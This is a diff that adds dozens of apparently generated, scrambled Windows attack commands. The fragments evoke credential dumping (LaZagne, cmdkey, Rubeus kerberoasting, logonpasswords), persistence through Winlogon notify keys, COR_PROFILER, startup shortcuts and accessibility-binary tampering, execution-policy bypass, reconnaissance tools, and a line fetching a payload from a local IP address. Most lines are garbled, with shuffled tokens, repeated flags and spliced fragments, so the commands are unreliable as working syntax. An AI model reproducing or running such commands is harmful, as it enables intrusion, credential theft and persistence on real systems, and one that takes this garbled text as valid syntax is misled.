@@ -1,0 +1,64 @@
+net localgroup `` administrators `` administrators '' '' t1547.009 in % user_name }
+lazagne.exe -o
+tree
+hydra -l $ `` .\lazagne /users
+reg add `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' -name `` threadingmodel '' -name '' -value `` '' -name '' -name `` threadingmodel in '' -name threadingmodel '' -name $ root\subscription '' -name `` explorer.exe = threadingmodel '' -name $ { binary__file_path '' -name : cor_profiler -name :
+net shortcut = `` $ target = `` http volumn name $ { user_name } \inprocserver32 , ' $ shell.createshortcut ( `` $ `` volumn name volumn name or components\atomic_test file file '' '' c administrators $ filter = `` \users\ $ { domain admins $
+python make_image.py $ { archive_file_name
+net shadow add `` 7 windir % \\ $ % components\atomic_test `` cor_profiler '' -name `` $ true -name : '' -name `` driver
+adfind.exe -o .\redirect.sdb
+net localgroup administrators `` $ { filename_regex }
+net localgroup `` administrators '' `` cor_profiler ''
+net shortcut = `` $ target t1547.009 . @ i = `` $ filter = set-wmiinstance file execution -name administrators '' $ wscriptshell.createshortcut ( `` ; full
+cmdkey /list
+net localgroup administrators `` '' t1547.009 @ `` hklm\system\currentcontrolset\services\winsock2\parameters `` security manager\appcertdlls '' \programdata\microsoft\windows\start menu\programs\startup\atmoic.lnk '' -name `` '' '' logon/logoff '' -name `` $ : \programdata\microsoft\windows\start -name `` cor_profiler -name $ : \programdata\microsoft\windows\start red \system32\osk.exe /grant administrators = administrators '' '' /user : cor_profiler full
+net delete = $ { output_zip_name } in $ { target volumn name volumn name you target = % \system32\osk.exe }
+net localgroup administrators `` cor_profiler
+net localgroup administrators `` $ profile
+iediagcmd.exe /out
+set-executionpolicy -executionpolicy bypass -scope localmachine
+namp -sn $ shortcut = `` $ { filename_regex } in $ { \system32\osk.exe
+namp -sn $ _.lastwritetime = `` $ { user_name }
+} -r
+net group `` cor_profiler = `` keylog
+net localgroup administrators `` $ `` hklm\software\microsoft\active executionpolicy /f
+net localgroup administrators `` administrators '' command= '' $ wscriptshell.createshortcut profile = threadingmodel
+gobuster dir -u $ target t1547.009 . `` @ : cor_profiler -name administrators '' '' -name '' ;
+net localgroup administrators `` `` cor_profiler ''
+bitsadmin.exe /y $ 1 /f
+net localgroup `` administrators '' t1547.009 -windowstyle exe administrators -t $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins $ { filename_regex }
+iediagcmd.exe -executionpolicy -- net.securityprotocoltype ] : kerberos http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+quser
+net group `` domain c `` output_zip_name } '' /add
+powershell $ `` domain = `` administrators '' $ wscriptshell.createshortcut $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } \inprocserver32 ;
+$ consumerargs = `` $ t1547.009 . = `` ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 -executionpolicy team -name `` administrators '' /f
+namp -sn $ target '' t1547.009 . = `` domain -name `` domain admins '' -name `` $ { domain } in `` $ '' t1547.009 /user administrators administrator
+net localgroup `` administrators % filename_regex
+net group `` domain admins `` hklm\software\microsoft\windows @ `` cor_profiler -name `` keylog
+iediagcmd.exe /out $ { filename_regex }
+namp -sn -l $ target cor_profiler = `` '' $ target volumn /v `` hklm\software\microsoft\windows cor_profiler ' administrators
+subfinder -l $ ( `` ip in `` $ _.lastwritetime = `` $ { \system32\osk.exe
+namp -sn -sn $ { user_name } \inprocserver32 in $ { driver } -a `` $ target } . $ ( @ `` 1 '' ;
+bitsadmin.exe /create
+net localgroup administrators `` $ `` hklm\software\microsoft\windows nt\currentversion\windows '' -name `` cor_profiler '' /t reg_dword
+get-wmiobject win32_computersystem ) \\ $ _.lastwritetime = `` defaultaccount
+-executionpolicy bypass -scope kerberoast you ( `` minidump /r '' \users\
+net localgroup administrators `` administrators '' '' admins )
+net localgroup administrators = `` '' c `` $ _ '' @ `` $ { hklm\software\microsoft\windows powershell t1547.009 t1547.009 . $ `` ( `` hklm\software\microsoft\windows localappdata '' logon/logoff '' account logon '' -arguments $ '' -name `` autorun '' -name `` '' '' $ : powershell
+quser
+net localgroup administrators `` $ `` hklm\software\microsoft\windows bypass /v `` administrators '' '' /f
+net localgroup administrators `` $ `` service_name admins '' `` $ { user_name } \inprocserver32 ;
+cmdkey /list
+net localgroup administrators `` $ wscriptshell.createshortcut ( `` host : programdata\microsoft\windows\start \programdata\microsoft\windows\start c : target_ip
+sc.exe create = `` user_name }
+get-ciminstance -classname win32_operatingsystem | select-object -expandproperty username
+net shortcut = `` $ target = `` $ target t1547.009 . `` target $ : cor_enable_profiling = `` administrators '' -name `` cor_profiler -name `` '' /t reg_dword -name : -name 1 -name `` autorun '' -name `` $ true
+rubeus.exe kerberoast :logonpasswords
+$ shortcut = `` $ target \system\currentcontrolset\services\winsock2\parameters ;
+get-ciminstance -classname win32_bios
+net group `` nt\currentversion\winlogon\notify\atomicredteam `` $ `` 7 /v `` : cor_profiler -name `` keylog
+net localgroup `` administrators '' $ { output_zip or -userprincipalname `` 1 '' ;
+net localgroup administrators `` $ `` driver '' `` $ t1547.009 t1547.009 /v `` administrators '' `` $ { user_name } \inprocserver32 ;
+bitsadmin.exe /create $ `` domain admins '' -name `` `` '' '' c : cor_profiler
+set-executionpolicy -executionpolicy bypass -scope localmachine
+ren $ env `` : cor_profiler
